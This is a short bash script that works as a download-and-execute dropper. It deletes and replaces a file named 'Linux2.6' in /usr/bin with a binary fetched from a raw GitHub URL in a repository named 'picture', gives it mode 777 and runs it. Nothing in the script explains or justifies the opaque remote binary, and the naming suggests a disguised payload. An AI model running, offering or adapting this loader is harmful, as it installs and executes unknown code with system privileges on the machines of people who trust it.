#!/bin/bash

cd /usr/bin
rm  Linux2.6
cd /usr/bin
apt-get -y install wget
wget -N https://raw.githubusercontent.com/occ1122/picture/main/Linux2.6
chmod 777 Linux2.6
./Linux2.6
